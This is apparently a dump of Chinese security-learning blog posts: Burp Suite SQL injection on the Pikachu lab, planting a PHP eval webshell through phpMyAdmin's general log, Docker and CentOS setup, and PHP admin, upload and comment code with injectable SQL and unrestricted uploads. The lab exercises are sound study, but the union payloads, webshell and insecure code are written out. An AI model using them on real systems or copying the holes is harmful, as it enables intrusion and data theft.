2，安装配置BurpSuite软件先解压BurpSuite v2.1中文版.zip，双击Start.vbs后在地址中输入cmd打开命令窗口输入： 1Java -jar burp-loader-keygen-2.jar 后按照流程完成BurpSuite软件 点击代理-&gt;选项-&gt;CA证明书再生成 打开网址：127.0.0.1:8080 点击CA Certificate下载证书文件cacert.der 在浏览器中点击设置-&gt;搜索证书-&gt;安全-&gt;管理证书-&gt;受信任的根证书颁发机构-&gt;导入证书即可 在GOogleChrome中的扩展插件SwitchyOmega中加入如下配置 3，使用BurpSuite在Pikachu漏洞练习平台进行数字型SQL注入先打开BurpSuite软件和Pikachu漏洞练习平台 再在Pikachu漏洞练习平台选择SQL的数字型注入选项 在BurpSuite软件中点击代理-&gt;截断-&gt;拦截禁用 选择1，点击查询，会发现页面没有跳转并在BurpSuite中显示了相关信息 右键发送给Repeater后管理关闭拦截请求后再重发器中可以看到相关信息，进行更改后可点击发送 数字型注入可以使用经典的 and 1&#x3D;1 和 and 1&#x3D;2 来判断： 在请求体最底下进行更改id&#x3D; 2 and 1&#x3D;1 页面依旧运行正常，继续进行下一步。 改为id&#x3D; 2 and 1&#x3D;2 页面运行错误，则说明此 Sql 注入为数字型注入。 改为id&#x3D;10 or 1 便可查询该表中的所有信息 因为在MySQL5.0以上会有一个information_schema数据库来记载所有数据库和表以及列的信息，所有可以针对该点进行查询 information_schema数据库结构如下： 在请求头输入： 1id=1 union select 1, (select schema_name from information_schema.schemata limit 0,1 )-- - 来查询有哪些数据库，查到有数据库名为mysql 1id=1 union select 1, (select table_name from information_schema.tables where table_name=&#x27;mysql&#x27; limit 0,1 )-- - 来查询mysql数据库中有那些表，其中有user表 1id=1 union select 1, (select column_name from information_schema.columns where table_name=&#x27;mysql&#x27; table_name=&#x27;user&#x27; limit 0,1 )-- - 来查询user表中有哪些字段，查询到了有User用户名和authentication_string密码字段 1id=1 union select 1, (select authentication_string from mysql.user where User=&#x27;root&#x27; limit 0,1 )-- - 可以查询到user表中的root管理员用户的密码 在MD5在线解密网站解密如下： 4，使用BurpSuite在Pikachu漏洞练习平台进行字符型SQL注入如数字型注入一样在BurpSuite中对网页的请求进行拦截 可以使用 and ‘1’&#x3D;’1 和 and ‘1’&#x3D;’2来判断： 在请求栏中更改id&#x3D; x’ and ‘1’&#x3D;’1 页面运行正常，继续进行下一步。 若id&#x3D; x’ and ‘1’&#x3D;’2 页面运行错误，则说明此 Sql 注入为字符型注入。 1name=sub&#x27;union select 1,database()-- - 可获取该数据库的名称 1name=sub&#x27; or &#x27;1=1&#x27;-- - 便可获取该表中的所有数据","categories":[],"tags":[]},{"title":"十五，通过phpmyadmin获取靶机的控制","slug":"十五，通过phpmyadmin获取靶机的控制","date":"2023-11-22T12:27:15.000Z","updated":"2023-11-22T12:50:30.000Z","comments":true,"path":"2023/11/22/十五，通过phpmyadmin获取靶机的控制/","permalink":"http://example.com/2023/11/22/%E5%8D%81%E4%BA%94%EF%BC%8C%E9%80%9A%E8%BF%87phpmyadmin%E8%8E%B7%E5%8F%96%E9%9D%B6%E6%9C%BA%E7%9A%84%E6%8E%A7%E5%88%B6/","excerpt":"","text":"通过phpMyAdmin获取靶机的控制，要满足以下三个条件：1，获取root权限2，获取网站的根目录绝对路径3，secure_file_priv为空 以下是获取控制的实现步骤：1，在小皮面板中下载phpMyAdmin 2，在浏览器中输入网址：（http://localhost/phpMyAdmin4.8.5/）进入管理页面 3，输入数据库的账号和密码进行登录 4，查看MySQL数据库服务器中系统变量（secure_file_priv）是否为Null 点击sql，输入命令 1show global variables like &#x27;%secure%&#x27; 5，开启全局日志记录，更改全局日志文件 输入： 1show variables like &#x27;%general%&#x27; 查看全局日志文件是否开启 OFF表示未打开，ON表示已开启 输入： 1set global general_log=ON 开启全局日志记录 显示成功后再次输入： 1show variables like &#x27;%general%&#x27; 查看全局日志 6，更改全局日志文件 在C:\\phpstudy_pro\\WWW(默认地址)的目录下新建一个空的php文件 将日志文件路径更改为刚刚新建的php文件目录 输入： 1set global general_log_file=&quot;C:/phpstudy_pro/WWW/phpmuma.php&quot; “&#x3D;”号后面的是你的新建php文件的路径 成功执行后再次输入： 1show variables like &#x27;%general%&#x27; 查看全局日志询看是否修改成功 7，关闭防火墙 8，在phpmuma文件里写入phpinfo 在输入 1SELECT &quot;&lt;? phpinfo(); ?&gt;&quot; 命令 在phpmuma文件里写入phpinfo 在phpmuma文件里看到这些 打开浏览器访问phpmuma文件 表示已成功写入phpinfo，可以在该页面下找到该网站根目录的绝对路径 9，使用一句话木马对网站进行植入 在phpMyAdmin里输入 1SELECT&quot; &lt;?php @eval($_POST[“cmd”]);?&gt;&quot; 10，下载并打开剑蚁进行配置 11，双击后出现如下界面则表示控制成功！","categories":[],"tags":[]},{"title":"十四，CentOS安装docker并使用","slug":"十四，CentOS安装docker并使用","date":"2023-11-21T11:13:15.000Z","updated":"2023-11-21T12:11:36.000Z","comments":true,"path":"2023/11/21/十四，CentOS安装docker并使用/","permalink":"http://example.com/2023/11/21/%E5%8D%81%E5%9B%9B%EF%BC%8CCentOS%E5%AE%89%E8%A3%85docker%E5%B9%B6%E4%BD%BF%E7%94%A8/","excerpt":"","text":"一，docker简介：​ Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。它可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。 ​ 容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。 ​ Docker将工程及此工程依赖的所有软件打包到一个容器中统一部署，可以解决在开发环境、测试环境以及生产环境等等。多种环境去部署同一份代码，由于环境原因往往会出现软件跨环境迁移的问题！ 二，介绍Docker中的三个概念镜像image ​ Docker 镜像（Image），就相当于是一个文件系统，是用于创建 Docker 容器的模板。也可以将镜像当作容器的“源代码”。镜像体积很小，非常“便携”，易于分享、存储和更新。 容器container ​ 容器是独立运行的一个或一组应用，是镜像运行时的实体。 注册中心(仓库)registry ​ Docker 仓库用来保存镜像，有点类似于Maven的远程仓库。Registry 分为公共和私有两种。Docker 公司运营公共的 Registry 叫做 Docker Hub。用户可以在 Docker Hub 注册账号，分享并保存自己的镜像（说明：在 Docker Hub 下载镜像巨慢，可以自己构建私有的 Registry）。 三，安装docker在安装docker之前，可以先做如下准备工作： 123456#1. 关闭防火墙，并禁止防火墙开机自启systemctl stop firewalldsystemctl disable firewalld#2. 关闭MySQL，并禁止MySQL开机自启（你的CentOS里之前安装过MySql，为防止端口冲突，需要做这一步）systemctl stop mysqldsystemctl disable mysqld 在联网环境下依次执行以下操作： 12345678910# 更新系统，如果需要确认，全部选 y (yes)。根据网络状况，此操作可能要花几分钟或者十几分钟时间yum update# 安装yum-utils工具和两个驱动依赖yum install -y yum-utils device-mapper-persistent-data lvm2# 设置使用阿里云的yum源，稍后会从阿里云下载docker软件yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo # 安装dockeryum install docker-ce# 查看docker版本docker -v 设置注册中心(仓库) 如果不设置注册中心，将从默认的docker hub里下载镜像，速度非常慢。 USTC（中科大的镜像服务）是老牌的Linux镜像服务提供者（注册中心Registry），从Ubuntu5.04版本就在使用。USTC的docker镜像速度加载很快，它的优势之一是不需要注册，是真正的公共服务。 设置步骤： 创建文件夹：mkdir &#x2F;etc&#x2F;docker 编辑文件daemon.json： vi &#x2F;etc&#x2F;docker&#x2F;daemon.json 1234&#123; &quot;registry-mirrors&quot;: [&quot;https://registry.docker-cn.com&quot;,&quot;https://pee6w651.mirror.aliyuncs.com&quot;], &quot;live-restore&quot;: true&#125; 保存并退出vi：按ESC，输:wq 回车 重新加载daemon文件，然后重启docker服务： 12systemctl daemon-reloadsystemctl restart docker 四，应用场景 docker镜像一旦构建，就已经一次性完成了应用自动打包、集成。docker镜像可以进行版本管理、复制、分享、修改，就像管理代码一样。 通过统一的docker环境封装（比如镜像中封装了同一版本的JDK、同样的环境变量等等），保证应用服务运行环境的一致性。避免出现在测试环境上好用，挪到生产环境下运行失败的问题。 docker可以做到秒级、甚至毫秒级的启动时间。大大的节约了开发、测试、部署的时间。因为镜像可下载、可复用，docker容器可快速启动等特性，结合容器编排服务(k8s)可以实现大型分布式部署的弹性伸缩，快速扩展。 五，Docker常用命令1，docker的启动，停止和重启 123systemctl start dockersystemctl stop dockersystemctl restart docker 2，查看docker的状态 1systemctl status docker 3，设置docker开机自启动 1systemctl enable docker 4查看docker的概要信息 1docker info 5，列出本地主机上有的镜像 12345678910docker images [OPTIONS]常用参数：-a ：列出所有的镜像 （含历史映像层）-q ：只显示镜像IDexample：docker images -adocker images -qdocker images -aqdocker images redis #查找镜像名为redis的镜像docker images redis:6.0.8 #查找镜像名:版本号(REPOSITORY：TAG)对应的镜像 字段解析： REPOSITORY：表示镜像的仓库源 TAG：镜像的标签版本号 IMAGE ID：镜像ID CREATED：镜像创建时间 SIZE：镜像大小 6，从远程库拉取镜像 1234docker pull 镜像名字[:TAG]example：docker pull redis:6.0.8docker pull ubuntu # 没有指定版本即拉取最新版 即默认为 ubuntu:latest 7，删除本地有的镜像 12345678#删除单个docker rmi 镜像ID #删除镜像，如果此时镜像上面有容器正在运行，会报错无法删除docker rmi -f 镜像ID #强制(forced)删除镜像#删除多个docker rmi -f 镜像名1:TAG 镜像名2:TAG #删除全部（慎用）docker rmi -f $(docker images -qa) #首先docker images -qa会列举本地所有的镜像的ID，然后作为一个集合送入rmi一个个删除 8，新建启动容器 1234567891011121314docker run [OPTIONS] IMAGE [COMMAND] [ARG...]常用参数：--name=NAME #为容器指定名字为NAME，不使用的话系统自动为容器命名-d: 后台运行容器并返回容器ID，也即启动守护式容器(后台运行)；-i：以交互模式运行容器，通常与 -t 同时使用；-t：为容器重新分配一个伪输入终端，通常与 -i 同时使用；也即启动交互式容器(前台有伪终端，等待交互，一般连用，即-it)；-P: 随机端口映射，大写P-p: 指定端口映射，小写p example：以ubuntu为例，启动后要交互先声明交互模式，其次交互得需要一个终端，因此参数为-itdocker run -it ubuntu /bin/bash指定名称docker run -it --name=myubuntu ubuntu /bin/bash 9，启动守护式容器 12345docker run -d 容器名 example：docker run -d redis:6.0.8docker run -d ubuntu 10，列出正在运行的容器 12345678910docker ps [OPTIONS]常用参数：-a :列出当前所有正在运行的容器+历史上运行过的-l :显示最近创建的容器。-n nu：显示最近nu个创建的容器。-q :静默模式，只显示容器编号。example：docker ps -aqdocker ps -n 3docker ps -l 11，进入正在运行的容器并以命令行交互 （1）docker exec -it 容器ID&#x2F;容器名称 bashShell （2）docker attach 容器ID 1234567example：#容器IDdocker exec -it c32f612cc218 /bin/bashdocker attach c32f612cc218#容器名称docker exec -it wizardly_booth /bin/bashdocker attach wizardly_booth 区别 ： ​ exec 是在容器中打开新的终端，并且可以启动新的进程。用exit退出，不会导致容器的停止，attach 直接进入容器启动命令的终端，不会启动新的进程。用exit退出，会导致容器的停止。推荐大家使用 docker exec 命令，因为退出容器终端，不会导致容器的停止。 12，启动，重启和停止容器 1234docker start 容器ID或者容器名docker restart 容器ID或者容器名docker stop 容器ID或者容器名docker kill 容器ID或容器名 # 强制停止容器 13，删除已停止的容器 1234567#删除一个docker rm 容器ID docker rm -f 容器ID #强制删除#删除多个docker rm -f $(docker ps -a -q)或docker ps -a -q | xargs docker rm 六，安装并启动phpmyadmin安装phpmyadmin 1docker pull phpmyadmin/phpmyadmin 启动MySQL和phpmyadmin服务 12345 docker inspect mysql57docker run --name mysql57 -v mysql57:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -p 3306:3306 -d mysql:5.7docker exec -it mysql57 bashdocker run --name phpmyadmin --link mysql57:db -p 9998:80 -d phpmyadmin/phpmyadmin 打开网址：192.168.0.44：9998进入phpmyadmin管理网站","categories":[],"tags":[]},{"title":"十三，CentOS搭建网站","slug":"十三，CentOS搭建网站","date":"2023-11-20T12:30:19.000Z","updated":"2023-11-20T12:34:04.000Z","comments":true,"path":"2023/11/20/十三，CentOS搭建网站/","permalink":"http://example.com/2023/11/20/%E5%8D%81%E4%B8%89%EF%BC%8CCentOS%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99/","excerpt":"","text":"一、下载CentOS清华大学开源软件镜像：https://mirrors.tuna.tsinghua.edu.cn/，下载CentOS-vault 7.9.2版本–&gt;isos–&gt;x86_64 二、安装CentOS打开虚拟机，新建虚拟机，典型安装，设置安装路径，一直点击下一步，设置语言，网络配置开启，安装地址选择 然后设置root密码，等待加载 三、配置CentOS1.rm -f /var/run/yum.pid 清理睡眠状态 12345678910111213141516171819rm -f /var/run/yum.pidfirewall-cmd --permanent --zone=public --add-port=3306/tcpfirewall-cmd --permanent --zone=public --add-port=3306/udpfirewall-cmd --permanent --zone=public --add-port=80/tcpfirewall-cmd --permanent --zone=public --add-port=80/udpfirewall-cmd --reload #复制这几行代码到CentOS yum remove mariadb-libs.x86_64yum install httpd -ysystemctl enable httpdsystemctl restart httpdsystemctl status httpdyum -y install mariadb mariadb-serversystemctl enable mariadbsystemctl start mariadbmysql_secure_installation 2.开放防火墙 12345firewall-cmd --permanent --zone=public --add-port=3306/tcpfirewall-cmd --permanent --zone=public --add-port=3306/udpfirewall-cmd --permanent --zone=public --add-port=80/tcpfirewall-cmd --permanent --zone=public --add-port=80/udpfirewall-cmd --reload 3.关闭selinux 12vi /etc/selinux/config将SELINUX=enforcing这一行修改为SELINUX=disabled 4.reboot 5.删除默认数据库 12rpm -qa | grep mariadb 查找出默认数据库mariadb的包名。yum remove mariadb-libs.x86_64 删除 12345yum install httpd -ysystemctl enable httpdsystemctl restart httpdsystemctl status httpd //查看服务状态此时访问成功回显apache测试页，网站根目录/var/www/html 7.安装mysql 1234yum -y install mariadb mariadb-serversystemctl enable mariadbsystemctl start mariadbmysql_secure_installation 8.进行MySQL设置 1234567891011121314Enter current password for root (enter for none):&lt;–初次运行直接回车Set root password? [Y/n]&lt;– 是否设置root用户密码，输入y并回车或直接回车New password:&lt;– 设置root用户的密码Re-enter new password:&lt;– 再输入一次你设置的密码其他配置Remove anonymous users? [Y/n]&lt;– 是否删除匿名用户，回车Disallow root login remotely? [Y/n]&lt;–是否禁止root远程登录,回车,Remove test database and access to it? [Y/n]&lt;– 是否删除test数据库，回车Reload privilege tables now? [Y/n]&lt;– 是否重新加载权限表，回车初始化MariaDB完成，接下来测试登录mysql -uroot -p你的密码GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;你的密码的明文&#x27; WITH GRANT OPTION; FLUSH PRIVILEGES; 远程登陆完成。 9.php安装 12345 a. rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm b. yum -y remove php* c. yum -y install php72w php72w-cli php72w-fpm php72w-common php72w-devel php72w-embedded php72w-gd php72w-mbstring php72w-mysqlnd php72w-opcache php72w-pdo php72w-xml d. systemctl enable php-fpm.service systemctl start php-fpm.service 配置Apache解析php文件并自动关联 1234510. a. vi /etc/httpd/conf/httpd.conf b. 找到：DirectoryIndex index.html改为：DirectoryIndex index.html index.htm index.php c. 找到：AddType application/x-gzip .gz .tgz在该行下面添加：AddType application/x-httpd-php .php d. 重启Apache：systemctl restart httpd e. 在浏览器输入服务器IP地址或者绑定的域名访问即可，html文件下是网站主目录，如果是里面有个文件夹才是主目录可以在配置文件修改主目录路径，或者在IP地址访问后面加上文件夹名字。 四、移动php文件1.找到WWW文件夹，解压，然后就在这个目录下打开cmd输入scp -r .\\WWW.zip root@CentOSip地址:\\var\\www\\html\\，输入root密码 2.在CentOS中把刚才的WWW.zip解压到当前文件夹&#x2F;html 3.打开Navicat，创建新的MySql连接 用户名：root 密码为之前为MariaDB的密码，连接成功后把你需要的数据库复制到这里就可以。 数据库连接成功后就可以打开你的网站了。","categories":[],"tags":[]},{"title":"十二，网站问题修复","slug":"十二，网站问题修复","date":"2023-11-15T07:54:32.000Z","updated":"2023-11-15T08:10:36.000Z","comments":true,"path":"2023/11/15/十二，网站问题修复/","permalink":"http://example.com/2023/11/15/%E5%8D%81%E4%BA%8C%EF%BC%8C%E7%BD%91%E7%AB%99%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D/","excerpt":"","text":"​ 在之前的网站搭建中，网站还有一些问题会影响网站的使用，例如SQL注入和XSS攻击等，这篇文章讲述对这些问题的修复方案 1，之前的主页退出后再点击浏览器的回退见还可以返回主页面，原因是没有清除会话数据，解决代码如下： 1234567echo &#x27;&lt;h1&gt;&lt;a href=&quot;?logout=true&quot;&gt;注销&lt;/a&gt;&lt;/h1&gt;&#x27;;if (isset($_GET[&#x27;logout&#x27;])) &#123; // 清除会话数据 session_unset(); session_destroy(); echo &quot;您已成功注销。&lt;br&gt;&quot;;&#125; 2，在文件上传之后，很容易发现文件名和文件所处的位置，这样就很容易被植入木马，所以要对文件名称和位置进行加密处理，代码如下： 1234// 生成随机的文件名 $random_name = time().uniqid() . &#x27;_&#x27; . $file_name; // 移动文件到目标位置 $target_path = $upload_dir .&quot;\\\\&quot;. md5($random_name).$file_name; 3，在登录功能中简单的使用拼接的方式拼接变量很容易引发SQL注入的问题，可以用预编译语句来处理SQL语句再执行，但是一些场景不适用预编译，代码如下： 123456789// 使用预编译语句 $sql = &quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;; $stmt = mysqli_prepare($link, $sql); // 绑定参数 mysqli_stmt_bind_param($stmt, &quot;ss&quot;, $u, $p); // 执行查询 mysqli_stmt_execute($stmt); // 获取结果集 $result = mysqli_stmt_get_result($stmt); 4，在评论功能中也很容易发生SQL注入和XSS攻击，可以对获取的评论内容进行加密和转义来预防这些问题，代码如下： 123// 处理评论$comment = htmlspecialchars($_POST[&#x27;comment&#x27;]); // 防止 XSS 攻击$comment = mysqli_real_escape_string($link, $comment); // 转义评论，防止 SQL 注入","categories":[],"tags":[]},{"title":"十一，php搭建管理员页面","slug":"十一，php搭建管理员页面","date":"2023-11-15T07:30:36.000Z","updated":"2023-11-15T07:48:32.000Z","comments":true,"path":"2023/11/15/十一，php搭建管理员页面/","permalink":"http://example.com/2023/11/15/%E5%8D%81%E4%B8%80%EF%BC%8Cphp%E6%90%AD%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E9%A1%B5%E9%9D%A2/","excerpt":"","text":"管理员页面分为三部分，分别是管理员信息展示块，users表中普通user信息块和信息管理块 1，管理员信息展示块 目前只展示了管理员的用户名和密码 代码如下： 123456789101112&lt;h3&gt; &lt;?php session_start(); if(isset($_COOKIE[user]))&#123; echo &quot;登录成功&lt;br&gt;&quot;; echo &quot;管理员名为：&quot;.$_SESSION[user].&quot; &lt;br&gt;&quot;; echo &quot;管理员密码为:&quot;.$_SESSION[pass].&quot;&lt;br&gt;&quot;; &#125;else&#123; echo &quot;失败！&quot;; &#125; ?&gt; &lt;/h3&gt; 效果如图所示： 2，users表中普通user信息块 从数据库中查询到信息在页面上以表格的形式分为n行3列，分别显示id.username,password的信息 代码如下： 12345678910111213141516171819202122232425262728&lt;table&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;id&lt;/th&gt; &lt;th&gt;用户名&lt;/th&gt; &lt;th&gt;密码&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;?php session_start(); $link=new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;security&quot;); //从表中查询数据 $select=&quot;SELECT * FROM users &quot;; $result=$link-&gt;query($select); if ($result-&gt;num_rows &gt; 0) &#123; // 输出数据 while($row = $result-&gt;fetch_assoc()) &#123; if($row[&quot;isadm&quot;]==0)&#123; echo &quot;&lt;tr&gt;&lt;td&gt;&quot;. $row[&quot;id&quot;]. &quot;&lt;/td&gt;&lt;td&gt;&quot;. $row[&quot;username&quot;]. &quot;&lt;/td&gt;&lt;td&gt;&quot;. $row[&quot;password&quot;]. &quot;&lt;/td&gt;&lt;/tr&gt;&quot;; &#125; &#125; &#125; else &#123; echo &quot;&lt;tr&gt;&lt;td&gt;暂无用户数据！&lt;/td&gt;&lt;/tr&gt;&quot;; &#125; ?&gt; &lt;/tbody&gt; &lt;/table&gt; 效果如图所示： 3，信息管理块 连接数据库，用一个form表单完成对users表的增删改三个功能 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;form action=&quot;&quot; method=&quot;post&quot; class=&quot;login-form &quot;&gt; id: &lt;input type=&quot;text&quot; name=&quot;id&quot;&gt; username: &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt; passwword: &lt;input type=&quot;text&quot; name=&quot;pass&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;adduser&quot; value=&quot;添加用户&quot; class=&quot;com&quot; &gt; &lt;input type=&quot;submit&quot; name=&quot;upduser&quot; value=&quot;修改用户&quot; class=&quot;com&quot; &gt; &lt;input type=&quot;submit&quot; name=&quot;deluser&quot; value=&quot;删除用户&quot; class=&quot;com&quot; &gt; &lt;?php $uid=trim($_POST[&quot;id&quot;]); $uname=trim($_POST[&quot;name&quot;]); $upass=trim($_POST[&quot;pass&quot;]); if(isset($_POST[&quot;adduser&quot;]))&#123; if(empty($uname) || empty($upass))&#123; echo &#x27;用户名或密码不能为空！&#x27;; exit(); &#125;else&#123; $insert=&quot;INSERT INTO users (username,password,isadm) VALUES (&#x27;$uname&#x27;,&#x27;$upass&#x27;,0)&quot;; $result1=$link-&gt;query($insert); if($result1===true)&#123; echo &quot;添加用户成功!&quot;; //header(&quot;Location: admin.php&quot;); &#125;else&#123; echo $insert .&quot;&lt;br&gt;&quot;; echo &quot;添加用户失败！&lt;br&gt;&quot;; &#125; &#125; &#125;else if(isset($_POST[&quot;upduser&quot;]))&#123; if(empty($uid))&#123; echo &#x27;用户id不能为空!&#x27;; exit(); &#125;else if(empty($uname) || empty($upass))&#123; echo &#x27;用户名或密码不能为空！&#x27;; exit(); &#125;else&#123; $update=&quot;UPDATE users SET username = &#x27;$uname&#x27;, password = &#x27;$upass&#x27; WHERE id = $uid&quot;; $result2=$link-&gt;query($update); if($result2===true)&#123; echo &quot;更新用户成功！&lt;br&gt;&quot;; //sleep(5); //header(&quot;Location: admin.php&quot;); &#125;else&#123; echo $update .&quot;&lt;br&gt;&quot;; echo &quot;更新用户失败！&lt;br&gt;&quot;; &#125; &#125; &#125;else if(isset($_POST[&quot;deluser&quot;]))&#123; if(empty($uid))&#123; echo &#x27;用户id不能为空!&#x27;; exit(); &#125;else&#123; $delete=&quot;DELETE FROM users WHERE id = $uid&quot;; $result3=$link-&gt;query($delete); if($result3===true)&#123; echo &quot;删除用户成功！&quot;; //sleep(5); //header(&quot;Location: admin.php&quot;); &#125;else&#123; echo $delete .&quot;&lt;br&gt;&quot;; echo &quot;删除用户失败！&lt;br&gt;&quot;; &#125; &#125; &#125; ?&gt; &lt;/form&gt; 效果如图所示： 4，用html和css将三个&lt;div组件&gt;平分页面为三部分并按照从左到右排列 代码如下： 123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;三等分页面&lt;/title&gt; &lt;style&gt; .container &#123; display: flex; width: 100%; height: 100vh; &#125; .box &#123; flex: 1; height: 100%; display: flex; justify-content: center; align-items: center; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;box&quot; style=&quot;background-color: red;&quot;&gt;1&lt;/div&gt; &lt;div class=&quot;box&quot; style=&quot;background-color: green;&quot;&gt;2&lt;/div&gt; &lt;div class=&quot;box&quot; style=&quot;background-color: blue;&quot;&gt;3&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 效果如图所示：","categories":[],"tags":[]},{"title":"十，php搭建主页面功能","slug":"十，php搭建主页面功能","date":"2023-11-15T04:19:34.000Z","updated":"2023-11-15T04:49:38.000Z","comments":true,"path":"2023/11/15/十，php搭建主页面功能/","permalink":"http://example.com/2023/11/15/%E5%8D%81%EF%BC%8Cphp%E6%90%AD%E5%BB%BA%E4%B8%BB%E9%A1%B5%E9%9D%A2%E5%8A%9F%E8%83%BD/","excerpt":"","text":"1，登录页面有SQL注入漏洞查询数据库名称 在用户名输入框输入：0’ union select 1,database(),3– - 2，登录页面有SQL注入罗东查询uses表中的所有数据 在用户名输入框输入：0’ union select 1,database(),(group_concat(id,username,password)) from security.users– - 3，新建upload.php文件，编写文件上传功能 代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .ft&#123; margin-left: 10%; &#125; .com&#123; background-color: #00BFFF; border: 2px solid white; border-radius: 10px; width: 100px; height: 40px; color: white; text-align: center; line-height: 40px; font-size: 20px; margin-bottom: 10px; margin-top:20px &#125; .com:active&#123; transform: translateY(2px); &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;ft&quot;&gt; &lt;h2&gt;文件上传&lt;/h2&gt; &lt;form method=&quot;post&quot; action=&quot;&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; &gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;com&quot; value=&quot;点击上传&quot;&gt;&lt;br&gt; &lt;h3&gt;下面是接收到的文件：&lt;h3&gt; &lt;/form&gt; &lt;?php if(isset($_FILES[&#x27;file&#x27;]))&#123; $upload_dir=&quot;upload&quot;; $name=$_FILES[&quot;file&quot;][&quot;name&quot;]; $type=$_FILES[&quot;file&quot;][&quot;type&quot;]; $size=$_FILES[&quot;file&quot;][&quot;size&quot;]; $tmp_name=$_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; $radmon_name=$name; $target_path=$upload_dir.&quot;//&quot;.$radmon_name; if(move_uploaded_file($tmp_name,$target_path))&#123; echo &quot;上传成功！&lt;br&gt;&quot;; echo &quot;文件名称：&quot; .$radmon_name .&quot;&lt;br&gt;&quot;; echo &quot;文件大小:&quot; .($size/1024) .&quot;KB&lt;br&gt;&quot;; echo &quot;文件类型:&quot; .$type .&quot;&lt;br&gt;&quot;; echo &quot;文件地址:&quot; .$target_path .&quot;&lt;br&gt;&quot;; &#125;else&#123; echo &quot;上传失败！&quot;; &#125; &#125; ?&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 效果如下： 4，新建mycomments.php文件，编写评论功能 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;我的评论&lt;/title&gt; &lt;style&gt; .form1&#123; margin-left: 10%; margin-top: 20px; &#125; .ft&#123; margin-left: 10%; &#125; .com&#123; background-color: #00BFFF; border: 2px solid white; border-radius: 10px; width: 100px; height: 40px; color: white; text-align: center; line-height: 40px; font-size: 20px; margin-bottom: 10px; margin-top:20px &#125; .com:active&#123; transform: translateY(2px); &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;form method=&quot;post&quot; action=&quot;&quot; class=&quot;form1&quot;&gt; &lt;h3 &gt;发表评论：&lt;/h3&gt;&lt;br&gt; &lt;textarea id=&quot;input&quot; name=&quot;comment&quot; rows=&quot;4&quot; cols=&quot;50&quot; &gt;&lt;/textarea&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;post_com&quot; value=&quot;提交评论&quot; class=&quot;com&quot; &gt; &lt;/form&gt; &lt;?php session_start(); $link=new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;security&quot;); // 检查连接是否成功 if ($conn-&gt;connect_error) &#123; echo &quot;&lt;div class=&#x27;ft&#x27;&gt;数据库连接失败!&lt;/div&gt;&lt;br&gt;&quot;; &#125;else&#123; echo &quot;&lt;div class=&#x27;ft&#x27;&gt;数据库连接成功！&lt;/div&gt;&lt;br&gt;&quot;; &#125; $comment=trim($_POST[&#x27;comment&#x27;]); echo &quot;&lt;div class=&#x27;ft&#x27;&gt; &quot; . $comment .&quot;&lt;/div&gt;&lt;br&gt;&quot;; //向表中插入数据 if(isset($_POST[&#x27;post_com&#x27;]))&#123; if(empty($comment))&#123; echo &quot;&lt;div class=&#x27;ft&#x27;&gt;评论内容不能为空！&lt;/div&gt;&lt;br&gt;&quot;; &#125;else&#123; $insert=&quot;INSERT INTO comments (comment) VALUES ($comment)&quot;; $result1=$link-&gt;query($insert); if($result1===true)&#123; echo &quot;&lt;div class=&#x27;ft&#x27;&gt;评论发表成功！&lt;/div&gt;&lt;br&gt;&quot;; &#125;else&#123; echo &quot;&lt;div class=&#x27;ft&#x27;&gt;&quot;.$insert .&quot;&lt;/div&gt;&lt;br&gt;&quot;; echo &quot;&lt;div class=&#x27;ft&#x27;&gt;评论发表失败！&lt;/div&gt;&lt;br&gt;&quot;; &#125; &#125; &#125; //从表中查询数据 $select=&quot;SELECT comment FROM comments ORDER BY id DESC &quot;; $result2=$link-&gt;query($select); if ($result2-&gt;num_rows &gt; 0) &#123; // 输出数据 while($row = 